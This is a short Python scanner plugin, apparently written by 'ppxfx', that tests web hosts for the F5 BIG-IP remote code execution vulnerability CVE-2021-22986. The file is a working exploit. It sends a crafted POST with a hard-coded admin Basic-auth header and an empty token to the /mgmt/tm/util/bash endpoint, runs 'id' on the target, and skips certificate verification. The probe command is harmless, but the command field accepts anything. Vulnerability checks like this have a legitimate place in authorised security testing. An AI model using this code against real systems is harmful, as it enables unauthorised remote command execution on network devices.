#coding:utf-8
import requests
import requests.packages.urllib3
import json
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {
      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'f5-big-ip 远程代码执行 cve-2021-22986',

      'level'     :   'high',
      
      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
      
  }
  return ret
def run(url,ua):
  ret = msg()
  target =  "/mgmt/tm/util/bash"
  url1 = url + target
  ret['url'] = url1
  headers = {
        "User-Agent": ua,
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }
  data = '{"command":"run","utilCmdArgs":"-c id"}'
  try:
    res = requests.post(url=url1,headers=headers,data=data,verify=False,timeout=30)
    if res.status_code == 200 and "commandResult" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret 